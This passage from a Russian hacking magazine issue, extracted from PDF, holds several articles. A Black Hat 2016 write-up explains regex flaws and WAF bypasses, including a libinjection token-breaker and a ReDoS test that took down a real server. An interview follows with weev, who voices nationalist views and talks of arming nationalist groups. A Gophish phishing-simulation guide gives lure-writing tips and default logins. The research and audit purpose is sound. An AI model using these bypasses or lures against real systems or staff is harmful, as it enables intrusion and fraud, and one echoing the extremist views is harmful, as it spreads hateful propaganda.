3. a |b, a||b. В первом случае допущен лишний пробел — такое выражение
   будет искать не «a или b», а «а пробел, или b». Во втором случае подразу-
   мевался один оператор «или», а написано два. Такое выражение найдет все
   вхождения a и пустые строки (ведь после | идет пустая строка), но не b.
4. \11 \e \q — в этом случае конструкции с бэкслешами неоднозначны, так
   как в разных парсерах спецсимволы могут обрабатываться по-разному в за-
   висимости от контекста. В разных парсерах спецсимволы могут обрабаты-
   ваться по-разному. В этом примере \11 может быть как бэклинком с номе-
  ром 11, так и символом табуляции (0x09 в восьмеричном коде); \e может
   интерпретироваться как очень редко описываемый в документации wildcard
   (символ Esc); \q — просто экранированный символ q. Казалось бы, один
   и тот же символ, но читается он по-разному в зависимости от условий и кон-
   кретного парсера.

ИЩЕМ УЯЗВИМЫЕ РЕГЭКСПЫ
Задокументировав все популярные ошибки и недочеты в таблицу, я написал
небольшой статический анализатор регулярных выражений, который анализи-
рует полученные выражения и подсвечивает найденные слабые части. Отчет
сохраняется в виде HTML.
   Запустив инструмент на выборке из 500 регулярных выражений, найденных
при сборе правил, я получил интересные результаты: программа обнаружила
более 300 потенциальных байпасов. Здесь и далее символы, подсвеченные
желтым, — это потенциально уязвимые места в регулярных выражениях.
  В первой строке регулярка уязвима к ReDoS.





              Пример запуска анализатора на выборке правил, отобранной через grep

Еще один пример — некорректно выбранная длина строки в запросе union
select. Очевидно, что ограничение можно обойти, просто вставив 101 символ
и больше.





  Некорректное использование максимальной длины подстроки в регулярном выражении

Теперь давай потестируем тулкит на более свежей базе. В качестве примера
скачаем последний билд WordPress и при помощи grep вытащим из его исход-
ного кода все регулярные выражения в файл regexp.txt.





     Сохраняем все регулярные выражения из кодовой базы WordPress в файл regexp.txt


Запустим наш анализатор и взглянем на сгенерированный отчет. В файле
wp-includes/class-phpmailer.php обнаружилось выражение [A-z] с опи-
санной выше уязвимостью (вхождение непредназначенных символов). Вот
лишь малый список open source CMS, в которых он используется: WordPress,
Drupal, 1CRM, SugarCRM, Yii, Joomla.



                           Продолжение статьи
COVERSTORY


    Начало статьи





                                           Доклад
                                             с Black Hat
                                                2016

       КАК ИСКАТЬ БАЙПАСЫ
 В СОВРЕМЕННЫХ WEB APPLICATION
  FIREWALLS И ЧТО С НИМИ ДЕЛАТЬ



ИЗУЧАЕМ УЯЗВИМОСТИ В WAF
Теперь, когда мы поняли основные проблемы с регулярными выражениями
и освоили методики поиска уязвимостей, давай рассмотрим примеры байпа-
сов в реальных современных WAF.

ModSecurity
ModSecurity — это бесплатный application-level WAF, который давно и ши-
роко используется в связке с Apache, nginx и другими серверами. На сай-
те ModSecurity есть страница, которая позволяет проверить параметр (стро-
ку в запросе) на наличие вредоносной нагрузки в соответствии с правилами
ModSecurity. Если в переданной строке обнаружена атака, то сайт ModSecurity
возвращает список правил, которые задетектили эту атаку.





                                           Обход простой регулярки в ModSecurity

На первом скриншоте слева я отправил URI-схему, и ModSecurity определил
это как атаку Remote File Inclusion. Однако если взглянуть на исходное регуляр-
ное выражение, которое детектит эту атаку (выделено красным на скриншоте),
мы увидим, что регулярка не учитывает регистр. Можно просто поменять ре-
гистр, скажем заменив буквы tt на заглавные, и тем самым обойти файрвол.

Comodo WAF
Компания Comodo, один из крупнейших поставщиков SSL-сертификатов, с не-
давнего времени выпускает правила для ModSecurity-совместимого продукта
Comodo WAF. Однако вместо того, чтобы писать свои правила фильтрации и
регулярные выражения, судя по всему, разработчики решили просто накачать
регулярок из других WAF и использовать их в своем продукте. А чтобы не при-
летел иск за использование чужого кода, Comodo просто поменяла некоторые
«незначительные» детали в правилах.
   Что конкретно сделали в Comodo? Эти умельцы начали заменять символы
в чужих регулярках их альтернативами, которые, на первый взгляд, идентичны
по смыслу. Например, квантификатор + они заменяли на {1,}. Вроде бы такой
подход выглядит нечестным, но безопасным.
   Однако если рассмотреть другой пример замены, видно, что разработчики
Comodo WAF зачем-то решили экранировать символ открывающей квадрат-
ной скобки. В примере ниже изначальное правило было верное: оно искало
on{event}, где {event} — JavaScript-событие onLoad, onMouseOver, onError, etc.





                    После «исправления» регулярка Comodo WAF отдает false positive

После того как выражение «поправили», вместо on-события ищется паттерн
\[a-z]. Это привело к тому, что обычный невредоносный запрос ?a=/on[a-z]
[a-z][a-z]=a расценивается как атака. Но при этом легитимное событие
onLoad= файрвол пропускает!

Байпас (ReDoS) клиентского и серверного файрвола приложения
Следующее регулярное выражение попалось мне во время анализа одного
очень защищенного реального приложения. В клиентском коде на JavaScript
была функция валидации email:





Как несложно догадаться, все, что идет после символа @, уязвимо к атаке типа
ReDoS. Соответственно, если сконструировать специально подготовленную
строку email, то регулярка будет очень долго работать в поисках совпадений и
в итоге повесит браузер клиента.
  Но покрашить клиентский браузер — достижение невеликое, поэтому я
стал копать дальше. Я предположил, что разработчики бэкенда не ограничи-
лись валидацией email только на клиентской стороне и проверяют user input
еще и на сервере. И скорее всего, на бэкенде для проверки email использует-
ся аналогичная конструкция. Я отправил специально сконструированный email
из предыдущего примера через форму несколько раз, и вскоре сервер начал
отдавать 504-ю ошибку. Наша «бомба из регулярки» успешно его «загрузила».





            Исследование уязвимой регулярки на клиенте позволило положить сервер

Обход XSS Auditor в Microsoft Edge
Перед тобой регулярка, которая используется в последней версии браузера
Microsoft Edge в библиотеке EdgeHTML.dll. Это выражение отвечает за работу
XSS Audior — встроенного в браузер механизма, который предотвращает экс-
плуатацию XSS-инъекций на стороне клиента. Взгляни на нее внимательно.


По задумке разработчика, в случае получения строки, которая удовлетворит
этому выражению, опасные символы заменятся на #. Если мы внимательно
посмотрим, то заметим, что это регулярное выражение ищет слово in, затем
один или больше символов, и затем открывающую скобку. Проблема кроется
в квантификаторе +, который, как нам уже известно, ищет «один или более»
символов. Если мы передадим ноль символов между словом in и открываю-
щей скобкой, мы получим байпас.





                                   Байпас XSS-аудитора в браузере Microsoft Edge

Ошибки, связанные с опечатками в ModSecurity и других WAF
Следующее регулярное выражение взято из ModSecurity и содержит явную
ошибку:


Это регулярное выражение должно искать:
•  div, один и больше пробелов, какую-то букву;
•  like, один или больше пробелов, какую-то букву;
•   ...
•  not, ДВА или больше пробелов, какую-то букву.

Очевидна проблема в опечатке перед закрывающей скобкой — туда затесал-
ся лишний пробел. В результате секция регулярного выражения с not и по-
следней частью (\s+\w) ищет два пробела между not и буквой: один после
not, один в качестве произвольного пробельного символа.
   Это «неправильное» регулярное выражение я встречал в коде ModSecurity
несколько раз, в комбинации с разными ключевыми словами. Затем случайно
наткнулся на него в коде PHPIDS. Выяснилось, что оригинальный коммит, с ко-
торым внесли ошибку, был сделан в 2008 году. То есть уязвимость существо-
вала почти восемь лет. Невольно закрадываются подозрения, что это может
быть и умышленный бэкдор.





                                   Коммит, который сломал регулярку в коде PHPIDS

Добавь к этому тот факт, что разработчики часто копируют чужие регулярные
выражения и правила из популярных продуктов, так что можно представить,
сколько еще WAF скопировали это регулярное выражение из кода ModSecurity.

ПОЛНЫЙ ОБХОД MODSECURITY
Давай подведем промежуточный итог. В данный момент инструментарий по-
мог нам создать множество байпасов из множества правил. Имея эти данные,
можно попытаться сконструировать универсальный байпас под произвольную
инъекцию.
  Возьмем простейшую инъекцию в параметр:





Все правила, основанные на регулярных выражениях,
в последней версии ModSecurity можно обойти следую-
щим запросом:



                                                         INFO

                                                                     По ошибкам
Таким образом, мы смогли эффективно обойти произ-         регулярных
вольный WAF при наличии произвольной инъекции.             выражений можно
                                                                             с высокой точностью
                                                                             определить WAF
Ошибки логики токенизации                                    (или семейство
Работая с байпасом регулярок, зачастую можно подо-       WAF), который
                                                                                 используетсябрать вектор, который будет обходить все регэкспы, одна-                                                                                в приложении,
ко в современных WAF есть другая преграда. В последней     а также его версию.
версии ModSecurity, кроме регулярных выражений, есть    А затем уже открыть
                                                                                   его исходныееще и отдельная библиотека libinjection. Она защищает от
                                                                         коды и работать
SQL injection в случаях, когда атакующему удалось обой-                                                                                с регэкспами
ти регулярки. Эта библиотека была представлена на Black     методом white-box.
Hat в 2012 году и быстро стала популярной из-за высокой
точности и скорости работы.
    Libinjection может представить любую строку в виде пяти токенов. Токен —
это некоторый символ (идентификатор), обозначающий класс той или иной
подстроки.




                                                    Пример
                                                         токенизации
                                                          строки
                                                         средствами
                                                                              libinjection





В примере выше libinjection присваивает каждой части строки свой класс —
string, operator, name, number и comment. По наличию в строке тех или иных
классов (токенов) библиотека делает вывод о наличии вредоносной нагрузки.
В результате она передает запрос приложению или блокирует его, тем самым
предотвращая атаку.
   Автор libinjection собирал примеры вредоносных нагрузок из множества
источников: шпаргалок по SQL-инъекциям, правил WAF, пейлоадов с хакерских
форумов и так далее. В результате для получившегося набора были посчита-
ны комбинации токенов, которые составляют основу блек-листа libinjection. На
момент написания статьи в базе библиотеки находится более 9000 токенов.
   Предположив, что в базе блек-листа есть не все токены с валидным
SQL-синтаксисом, мы можем попробовать найти такие SQL-выражения, кото-
рые будут считаться валидными запросами, и в то же время токен для таких за-
просов не будет в черном списке libinjection. Для этого я написал небольшой
SQL-фаззер.
  В качестве входных данных cpp-sql-fuzzer получает маску SQL-строки.
Дальше нужно указать, что конкретно фаззить и каким алфавитом. После это-
го фаззер начнет работу и будет записывать все валидные запросы в одну та-
блицу, а все остальные (те, что не вызывают MySQL syntax error) — во вторую.
Вторая таблица нужна для случая, когда sql-fuzzer нафаззит какую-нибудь кон-
струкцию с функцией, которая будет требовать, например, два параметра, а
не один, мы увидим это в логах и сможем вручную добавить второй параметр.
   Фаззер лучше всего развернуть в облаке, например в Google Cloud Engine.
На конфигурации с восьмью ядрами и примерно 50 Гбайт памяти 21 миллион
запросов мне удалось профаззить за десять минут, то есть скорость состави-
ла примерно 35 тысяч запросов в секунду (хотя для MySQL это, судя по доку-
ментации, не предел).
  В качестве примера составим список разрешенных символов между клю-
чевым словом SELECT и строковым параметром 1. Для этого отдадим фаззеру
следующее выражение:


И начнем фаззинг. В составе libinjection есть бинарник, который вычисляет то-
кен по заданной строке, им и воспользуемся.





                                  Результат работы фаззера на PoC-строке

Как видишь по скрину, за тридцать секунд нашлось тринадцать уникальных
векторов, которые ранее не были учтены в блек-листе библиотеки, то есть об-
ходят libinjection. Разберем один из них.





                    Пример байпаса libinjection, который нафаззил фаззер


Если первый вектор (SELECT  1  FROM...) очевидно вредоносный, то вто-
рой (SELECT!<1  FROM) оказался рабочим и не блокируется. Соответственно,
!<1 — наш токен-брейкер для libinjection.
   Если вставить эту конструкцию в любую часть SQL-запроса, то все, что идет
после нее, не будет детектировано. Например, мы сможем вызвать произ-
вольную функцию или передать любую вредоносную нагрузку. При этом фин-
герпринт (токен) не изменится, а значит, WAF не сможет детектировать атаку.
   Чтобы сократить время читателя на фаззинг, я провел описанные выше ма-
нипуляции на популярных базах данных в популярных точках входа. Теперь,
если, к примеру, тебе встретится инъекция в MySQL и WAF будет фильтровать
все очевидные символы между -1 и UNION, просто воспользуйся моими ре-
зультатами для подстановки неочевидных и притом валидных SQL-значений.
   Готовые результаты в виде оформленной таблицы можно найти здесь.

ВЫВОДЫ
Как мы видим, обход WAF — это вполне посильная задача. Очень важно не
просто фаззить insertion point’ы, а разбираться в самой причине возникнове-
ния байпаса. Иногда для этого надо прочитать исходники и проанализировать
большое количество правил. Зачастую в таких исследованиях находится не
один, а целая пачка байпасов. Все инструменты из этой статьи доступны в от-
крытом доступе на Гитхабе. Если хочешь, присоединяйся к разработке нашего
тулкита, и вместе мы найдем еще больше векторов!

Почему байпасы будут жить всегда

Возможности обойти WAF обычно ищут две стороны, но ирония состоит в том,
что в качественном исправлении обходов никто не заинтересован.
   Первая сторона — это атакующие, они проводят black box testing и ищут
дыры в веб-приложении. Когда они обнаруживают, что приложение защищено
при помощи WAF, то стараются перебрать все известные им варианты обхода.
Это могут быть техники, описанные в публичных статьях, собственные нара-
ботки или фаззинг. В последнем случае атакующий фаззит огромное количе-
ство пользовательского ввода, чтобы найти тот символ, который будет обхо-
дить правило WAF. В случае успешного обхода атакующий не будет отправлять
вендору отчет об уязвимости, и, скорее всего, она не будет исправлена.
   Вторая сторона — это защитники (например, безопасники в компании),
они обычно пользуются продуктами, которые создала сторонняя фирма. Ре-
альность такова, что и они редко разбираются в отчетах, которые генерирует
WAF, и почти никогда не отправляют отчет об уязвимости разработчикам.
  За опенсорсными проектами WAF обычно стоит небольшая команда, кото-
рая мейнтейнит правила на добровольных началах. Даже если подробный от-
чет о найденных обходах достигнет внимания такой команды, выпуск патча мо-
жет затянуться из-за банальной незаинтересованности.
COVERSTORY



                                                                             Беседовал Дмитрий
                                                                                  Чумаченко
                                                                                                    dichum@mail.ru





                                                                                                                                                                                                                                                                                                                    Скрынник
                                                                                                                                                                                                АнтонЗИГ-ХАКЭНДРЮ «WEEV» АУЭРНХАЙМЕР
О РОЛИ ХАКЕРОВ В ПОЛИТИЧЕСКОМ                                                     фото:
АКТИВИЗМЕ                                                                                                                                                  Автор


Эндрю Ауэрнхаймер — американский серый хакер, хакти-
вист и признанный тролль. В марте 2013-го был осужден
на три с половиной года за взлом компьютерной сети те-
лекоммуникационного гиганта AT&T и похищение данных
120 тысяч владельцев iPad, включая высокопоставленных
сотрудников пентагоновского агентства DARPA, руководя-
щих работников NASA и других государственных ведомств
США, высокопоставленных сотрудников Google, Amazon,
Microsoft и AOL и руководителей других крупных компаний.

В апреле 2014 года Ауэрнхаймер был освобожден по ре-
шению апелляционного суда, который признал его при-
говор незаконным. Сейчас weev активно занимается по-
литической пропагандой и хактивизмом. В марте 2016
года Ауэрнхаймер снова попал в новости после того,
как разослал на тысячи подключенных к Сети принтеров      WARNING
листовки антисемитского содержания.
                                                                          Редакция журнала
                                                                          не разделяет поли-
Если говорить о моей истории со взломом AT&T,                                                                                тических взглядов
то тут вся проблема — в озлобленности прави-      Ауэрнхаймера, среди
тельств, особенно крупных империй. Большие им-     которых — национализм
                                                                      и убежденность в пре-
перии не любят нарушений, поэтому они стараются ка-                                                                            восходстве белой расы.
ким угодно образом криминализировать повседневные
модели поведения, чтобы сохранить позиции своих оли-
гархов.

Россия, впервые увидев биткойн, незамедлительно попыталась его за-
претить, пока не выяснила, что биткойн — лучший способ контроля прибыли
для обычных игроков. США и Россия имеют истории оказания давления на ор-
ганизации, которые идут против интересов государства, и пытаются уничтожить
их, даже если эти организации не сделали ничего неправильного, как в юриди-
ческом, так и в моральном аспектах.

Моя адвокатская защита была прекрасной. Гигантская реакция в моей
стране была вызвана тем, что сделанное мной ничем не отличалось от любого
другого доступа к публичному веб-серверу.

Если то, что сделал я, было незаконным, то размещение любых постов
в «Твиттере» или «ВКонтакте» также незаконно. Не было никакой причины
для обвинения. Оно было вызвано тем, что правительству не нравились мои
политические взгляды, поэтому они желали совершить насилие, чтобы заста-
вить меня замолчать.

Другие хакеры совсем недавно подвергались подобному обращению,
что привело в конечном счете к их самоубийству. Три года назад Аарон
Шварц покончил с собой, а затем был и аналогичный моему случай Лэнса Мура.
Если бы он боролся, то в конце концов выиграл бы на тех же основаниях, что и я,
но давление было настолько сильным, что вместо этого он тоже покончил с со-
бой. Я думаю, все вовлеченные в это дело прекрасно осознавали важность
того, что происходит, зная о двух трупах до меня.

Тюремное заключение, безусловно, повлияло на мои взгляды, жизнь
и деятельность. Моя цель сейчас — изменить правительство моей страны
так, чтобы насилие и вред, которые администрация Обамы совершила со мной,
никогда не повторились с другими хакерами. Моя команда менее сосредото-
чена на реорганизации корпоративных структур и более на встряске коррупции
в правительстве США.

Несомненно, множество людей используют компьютеры для соверше-
ния преступлений. Правительство США распространяет эту картинку для вы-
деления огромных бюджетов на борьбу с киберпреступностью, но чиновни-
ков, кажется, не волнуют реальные преступники. Все следственные ресурсы,
как правило, нацелены на политических активистов, исследователей и инфор-
маторов.

Большинство людей, использующих компьютеры для кражи денег,
не сидели за решеткой и дня. США, как и Россия, никогда не преследовали
таких людей в значительной степени. Крупные игроки позволяют преступникам
действовать беспрепятственно и наказывают их, только если видят большие
суммы денег, которые могут привести к банкротству. Они не боятся воров. Они
до смерти боятся политических хакеров, только потому, что мы никогда не при-
сутствовали в политических схемах ранее.

Зачастую потеря данных происходит не по вине пользователя, а вслед-
ствие небрежного поведения компании, которой вы их доверили. В на-
стоящее время у корпораций нет стимула для вашей защиты. Если компания
продает неисправный автомобиль и вы умираете в результате этого, можно
надеяться на правовую защиту. Если кто-то продает вам услугу в интернете
и отдает вашу кредитную карту преступникам, ни на какую правовую защиту
рассчитывать нельзя. Это безумие. Реальная проблема состоит в том, что ком-
мерческие предприятия не хотят заботиться о своих клиентах.

Грамотное использование технологий — вещь юридически нейтраль-
ная. Это делают как хорошие, так и плохие люди, и мотивы у них могут быть
разные. Очень сложно провести качественный анализ того, сколько хороших,
а сколько плохих людей.

Троллинг начался не с интернета, он берет свои истоки у самых корней ев-
ропейских культур. Обрядовые бои с оскорблением достоинства врагов игра-
ли большую роль во всей Европе. Древние саксонцы называли их «флайтинг»,
а норвежцы — «сенна». Грюнвальдские мечи, сопровождающие издевки со сто-
роны тевтонцев, стали символом Польского национального войска.

Технологии чрезвычайно важны для политического активизма. Чем бы
вы ни занимались в жизни, в первую очередь вы должны использовать техно-
логии. Американский венчурный капиталист Марк Андрессен, который изобрел
современные веб-браузеры и сидит в совете директоров Facebook и eBay,
сказал: «Программное обеспечение поедает мир!» Он имел в виду, что любая
компания, не разрабатывающая программное обеспечение, не будет суще-
ствовать через пятьдесят лет. Неважно, что вы делаете в жизни, технологии —
самое главное.

Моей участи смогут избежать только неэффективные активисты. Я ду-
маю, что очень трудно быть одновременно принципиальным и эффективным.
Я выступал публично, зная, что мое правительство коррумпировано и нечести-
во, и честно принимал как мучительную возможность даже то, что они готовы
убить меня. В Вако, штат Техас, США хладнокровно убили 78 мужчин, женщин
и детей. В Руби-Ридж США застрелили невинную безоружную женщину в спи-
ну, когда она держала на руках своего младенца. Они убивают националистов
и сепаратистов на протяжении всей истории моей страны без оснований.

Я был готов умереть, но вместо этого был просто подвержен пыткам
и заключен в тюрьму. Если вы достаточно хороши для того, чтобы бросить
вызов плохим вещам, о которых нельзя говорить, то, вероятно, то же самое
произойдет и с вами. Если вы к этому не готовы, оставайтесь дома.

С профессиональной точки зрения я националистический пропаган-
дист и влияю на американское общество. Для души я занимаюсь исследо-
ванием машинного обучения для потенциальных военных приложений, кото-
рые я планирую распространять бесплатно среди националистических групп
по всей Европе и Америке.

Рекомендую всем прочесть книгу Габриэллы Колмен Hacker, Hoaxer,
Whistleblower, Spy: The Many Faces of Anonymous. Что до фильмов, то я бы
посоветовал «Хакерские войны» (The Hacker Wars).


7 октября 2016 года в Харькове на Всеукраинской битве хакеров и фору-
ме по кибербезопасности HackIT Эндрю Ауэрнхаймер выступил с докладом
Hacking geopolitics to advance nationalism.
 PCZONE
БОЛЬШАЯ
РЫБАЛКА ШЛЕМ ФИШИНГОВЫЕ
 ПИСЬМА СВОИМ
 СОТРУДНИКАМ





 Сегодня мы изучим Gophish — фреймворк, ко-
 торый позволяет проверить реакцию сотруд-
 ников компании на фишерские послания. Его
 идея оказалась настолько привлекательной,        84ckf1r3@gmail.com84ckf1r3
 что фишеры уже стали делать собственные
 средства автоматизации по его подобию.


 В одной из прошлых статей мы приводили примеры использования социаль-
 ного инжиниринга в практике известных пентестеров. Важную роль в их мето-
 дах играли фишинговые письма, заставлявшие людей добровольно сдавать
 ключи от крепости. Сегодня это стало популярным способом аудита, и для него
 уже созданы средства автоматизации. Защитный фишинг служит вакцинацией
 и помогает избавить компанию от гнилой рыбы.

 ЛОВЛЯ СЕТЬЮ И ОСТРОГОЙ
 Изначально фишинг рассматривался как общий способ
 мошенничества, адаптировавший старые схемы к реа-
 лиям интернета. Затем он разделился на два основных
 направления: массовый и целевой. Большинство фи-
 шинговых сообщений носят массовый характер и не на-
 правлены ни на кого конкретно. Они затрагивают разные      WARNING
 группы людей и берут числом сообщений. Наспех сле-                                                                               Статья написана в ис-
 пленные письма о мнимых крупных выигрышах игнори-     следовательских целях.
 рует большинство опытных пользователей, но и на вся-     Вся информация в ней
                                                                             носит ознакомительный кого мудреца довольно простоты. Кто-то действительно
                                                                               характер и адресована
 недавно участвовал в лотерее и с нетерпением ждет ре-                                                                          специалистам по безо-
 зультата розыгрыша (вот только разыграют его самого),            пасности.
 кто-то просто алчен по натуре, а а кто-то кликает на все
 подряд, надеясь на антивирус. Поэтому даже набивший
 оскомину «нигерийский спам» до сих пор приносит свои плоды.
    Куда более изощренный вид атак — целевой, или spear-phishing. В январе
 прошлого года из-за такой атаки крупная европейская биржа Bitstamp лиши-
 лась почти девятнадцати тысяч биткойнов — более пяти миллионов долларов
 по установленному на тот момент курсу. Расследование показало, что целе-
 вой фишинг, направленный на руководителей биржи, продолжался больше
 месяца. Все это время им не только приходили поддельные письма (как обыч-
 но, содержащие ссылку на зараженный сайт либо инфицированное вложение),
 но и отправлялись менее тривиальные сообщения по разным каналам, вклю-
 чая мессенджеры.
    Каждое из них было продумано в мельчайших деталях и составлено с уче-
 том личных интересов получателя. Например, технического директора биржи
 пытались заинтересовать через Skype бесплатными билетами на фестиваль
 панк-рок-музыки, на который он как раз мечтал попасть (больше пишите о сво-
 их желаниях в соцсетях!). Для получения билетов предлагалось заполнить при-
 ложенную анкету в формате Microsoft Word с макросом внутри. Примитивно?
 Да, но ведь сработало! Другое дело, что в тот раз атакующим не повезло: до-
 кумент открыли на компьютере, не имеющем доступ к кошельку биржи.
    Однако фишеры не сдавались. На смену одним уловкам приходили новые.
 Частота получения фишинговых сообщений увеличивалась, и в конечном сче-
 те сисадмин биржи Лука Кодрич стал жертвой своего тщеславия. Ему очень
 польстило приглашение стать почетным членом Ассоциации вычислительной
 техники. Не видя предупреждений Microsoft Word и антивируса, сквозь слезы
 умиления он запустил инфицированный документ на рабочем компьютере.
 В пару кликов кандидат в почетные админы отдал неустановленным лицам са-
 мый дорогой сердцу каждого майнера файл — wallet.dat, данные кошелька
 биржи вместе со всеми паролями и доступом к обоим серверам. Четыре дня
 авторы макроса переводили средства, пока Лука кусал локти. Если бы на бир-
 же практиковался регулярный аудит с имитацией фишинга, то Лука получил бы
 хорошую прививку.

 ГОТОВИМ СНАСТИ
 У фишинга как инструмента аудита есть масса плюсов, но и недостатков тоже
 хватает. Создание качественных подделок занимает уйму времени, а их от-
 правка часто распознается и блокируется защитными системами — от про-
 стейших спам-фильтров до специализированных антифишинговых. Поэтому,
 чтобы проверить реакцию своих систем и сотрудников на качественно со-
 ставленные фишинговые письма, отделу безопасности приходится тратить
 рабочее время на тщательную подготовку. Упростить эту рутинную процедуру
 помогают новые инструменты — автоматизированные системы отправки под-
 дельных писем и сбора статистики откликов на них.
    Специалист по безопасности Джордан Райт (Jordan Wright) в начале это-
 го года приступил к разработке Gophish — фреймворка с открытым исходным
 кодом, позволяющего быстро выяснить реакцию сотрудников на фишинговые
 письма. Изначально фреймворк разрабатывался для ускорения экспресс-ау-
 дита в собственной компании, но сейчас его возможности постепенно расши-
 ряются.
   В названии Gophish заложена игра слов: это и призыв к фишингу (в благих
 целях), и указание на язык разработки Go, придуманный в Google. Последняя
 предварительная версия фреймворка — Gophish v.0.2 совместима с 32-бит-
 ными и 64-разрядными версиями Windows, Mac и Linux. Она поддерживает
 ускоренную отправку писем через gomail, составление модальных диалогов
 через sweetalert2, создание всевозможных шаблонов, а также планирование
 и запуск фишинговых кампаний по расписанию.

 Готовим прикорм

 Обычно тестовая рассылка считается эффективной симуляцией фишинга
 только в том случае, если на отправленные письма среагировало более трети
 сотрудников. Как именно — уже другой вопрос. Одни клюнут на удочку, другие
 оповестят администратора, третьи просто удалят послание. Поэтому письмо
 составляется так, чтобы сразу заинтересовать целые отделы внутри проверяе-
 мой организации.
    Как настоящая, так и тестовая фишинговая кампания должна иметь свежий
 инфоповод, касающийся большинства потенциальных жертв. Проще всего
 отыскать его на официальном сайте проверяемой компании. Это могут быть
 готовящиеся сделки, анонс нового продукта, проведение конференции и мно-
 жество других событий. Главное, чтобы они были на слуху.
   Одно из таких событий становится темой письма. Дальше уже начинает-
 ся полет фантазии, но не слишком высокий. Если письмо сильно отличается
 по стилю от остальных, оно вызовет подозрения. Впрочем, это касается толь-
 ко внутренней переписки. Письмо извне может иметь совершенно произволь-
 ный стиль.
    Как правило, основной текст письма служит для усыпления бдительности.
 В нем надо сообщить побольше общеизвестных фактов прежде, чем предло-
 жить сотруднику выполнить что-то потенциально опасное: перейти по ссылке,
 открыть документ, изменить настройки, отправить скан паспорта и фотогра-
 фии банковской карты с двух сторон. Это и будет конечным действием, к вы-
 полнению которого фишер побуждает разными методами. Он может нагонять
 скуку или напирать на безотлагательность ответа, слать нелепые угрозы и де-
 ловые предложения, апеллировать к алчности, тщеславию, любопытству и про-
 чим человеческим качествам.
    Все ответы собирает фишинговый сервер, разбирая письма на составля-
 ющие. Оценка результатов тестовой кампании дает представление о тех со-
 трудниках, доступ которым лучше временно ограничить до повышения их уров-
 ня компетентности в вопросах безопасности. Не стоит делать исключений
 для руководящего состава, хоть он наверняка и будет против. Именно руково-
 дители становятся главной мишенью целевого фишинга и наносят максималь-
 ный ущерб своей фирме в случае прокола.
    Реальную пользу такие проверки будут приносить только при условии их
 регулярного проведения, разнообразия и сочетания кнута с пряником. Нельзя
 постоянно держать людей в страхе — они привыкают к такому состоянию и пе-
 рестают адекватно реагировать. Достойно выдержавшие экзамен должны по-
 лучать какие-то поощрения, но не исключаться из следующих тестов.


 НА РЫБАЛКУ!
 Мы пробовали запускать Gophish в среде Windows 7 и 10 — программа стар-
 тует без каких-либо ухищрений. Просто скачиваешь архив с версией соответ-
 ствующей разрядности (32/64 бита), распаковываешь его куда угодно и за-
 пускаешь gophish.exe. Консольная программа автоматически создает два
 сервера: фишинговый и админский. Их адреса отображаются в командной
 строке. Как легко догадаться, все управление происходит через админскую
 часть. Просто введи в адресной строке браузера http://127.0.0.1:3333
 (если используется заданный по умолчанию порт), и после перехода увидишь
 веб-форму авторизации Gophish.





 Логин по умолчанию задан admin, а пароль — gophish. В официальной до-
 кументации они неверно указаны как одинаковые (gophish/gophish — так
 было в ранних версиях). После успешного входа откроется панель управле-
 ния. Как в ней, так и в шаблонах большинство названий пунктов говорят сами
 за себя. Однако встречаются и просто пустые поля, заполнение которых нео-
 чевидно даже после прочтения справки. Фреймворк только начинает разви-
 ваться и еще имеет разные недочеты.





                                                    Панель управления Gophish


 Каждый аудит протоколируется в Gophish как отдельная фишинговая кампа-
 ния. Почти все ее параметры настраиваются путем выбора из предварительно
 внесенных в базу элементов. Имена сотрудников, адреса электронной почты,
 привлекательные темы писем, адреса целевых страниц и так далее. После
 рассылки сервер слушает указанный порт и собирает ответы пользователей
 в базу данных. Если на приманку клюнул хотя бы один сотрудник, его ответ по-
 падет в общий лог.





                                               Шаблон приманки в Gophish

 Детальные логи содержат дату и время отправки писем, а также временную
 метку ответа клюнувших сотрудников. Это помогает вычислить самых доверчи-
 вых из них и провести с ними внеочередной инструктаж. На этот раз им мож-
 но будет предъявить не абстрактные нарушения политики безопасности, а их
 конкретные проколы, поскольку для убедительности Gophish автоматически
 собирает всю конфиденциальную информацию, отправленную в ответных со-
 общениях.
   В отличие от других популярных инструментов аудита, Gophish работает
 в локальной сети, а не как облачный сервис. Запуск on-premise повышает без-
 опасность Gophish, поскольку в случае SaaS-решений корпоративные секреты
 неминуемо утекают в интернет вместе с ответами на тестовые письма. Под-
 робнее о функциях Gophish можно прочесть в руководстве.
    Появление Gophish подстегнуло развитие других средств автоматизации
 фишинга, и далеко не все из них задумывались с благими целями. Ключевая
 задача у большинства из них одна: выиграть время, устроив блицкриг на по-
 чтовый сервер атакуемой компании. Однотипные фи-
 шинговые письма быстро выявляются и попадают
 в спам. Персонализированные и отправленные с раз-
 ных доменов доходят практически гарантированно.
 Самый функциональый тулкит под названием PhishLulz
 представил на недавней конференции Kiwicon другой
                                   WWW эксперт — Мишель Орру (Michele Orru). Исходный код
 PhishLulz написан на Ruby и также доступен на GitHub.                                                                                  Phishery — сборщик учет-
 Отправленные с помощью PhishLulz фальшивые пись-    ных данных с поддержкой
 ма  выглядят  очень  убедительно. Это  достигается     SSL и инжектором URL
 за счет использования фреймворка BeEF (The Browser                                                                                    Phishing frenzy — фрей-
  Exploitation Framework), запуска отдельных виртуаль-                                                                       мворк для фишинга
 ных машин в Amazon EC2 для каждой атаки, автомати-         на Ruby on Rails
 ческой регистрации доменов и собственного центра
                                                                                     King-phisher — тулкит
 сертификации. Похоже, прямо сейчас в развитии фи-                                                                       для автоматизации фи-
 шинга происходит подъем на качественно новый уро-      шинговых кампаний
 вень.
PCZONE





        Владимир Ткачев,
         технический директор
        VMware в России и СНГ
ИГРА
В ОБЛАКА РУЛИМ ВИРТУАЛЬНЫМИ СЕРВЕРАМИ
 ПРИ ПОМОЩИ VMWARE CLOUD





В новой версии среды виртуализации VMware vSphere
появилась возможность переносить виртуальные маши-
ны из частного облака в публичное, между публичными
облаками Google, Amazon и Microsoft и, при желании, об-
ратно в частное. На примере AWS мы по шагам разберем,
как это делается.

ОБЛАКО VMWARE ПОВЕРХ AWS
VMware уже давно работает с командой Amazon. Еще в vSphere 5.1 мож-
но было расширить локальную инфраструктуру за счет публичного облака
AWS, переносить виртуальные машины в EC2 и управлять ими там (подроб-
ности — по ссылке). Сейчас мы выходим на новый уровень сотрудничества
и предлагаем наш совместный проект. Технологии VMware Cloud on AWS по-
зволяют использовать все те же надежные, проверенные временем решения,
которые уже много лет работают в ЦОДах наших заказчиков, но уже c возмож-
ностью бесшовного расширения в публичное облако Amazon. Причем это ка-
сается не только базовой технологии виртуализации вычислительных ресур-
сов, но также и виртуализации сети (VMware NSX) и системы хранения данных
(VMware vSAN).
   Таким образом, с одной стороны, заказчик может использовать уже извест-
